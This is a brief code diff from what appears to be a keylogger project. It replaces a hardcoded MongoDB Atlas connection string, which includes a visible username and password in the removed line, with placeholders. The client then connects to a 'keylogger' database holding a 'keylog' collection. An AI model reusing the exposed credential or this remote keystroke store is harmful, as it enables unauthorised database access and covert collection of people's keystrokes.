@@ -5,7 +5,7 @@ import os
 # client = pymongo.MongoClient("mongodb://localhost:27017/")
 # db = client["mydatabase"]
 # collection = db["mycollection"]
-client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
+client = pymongo.MongoClient("mongodb+srv://<username>:<password>@keyspy.iarapa1.mongodb.net/") #monogDB Atlas connection link
 db = client["keylogger"]
 keylogs_collection = db["keylog"]
 # payload_collection = db["payload"]
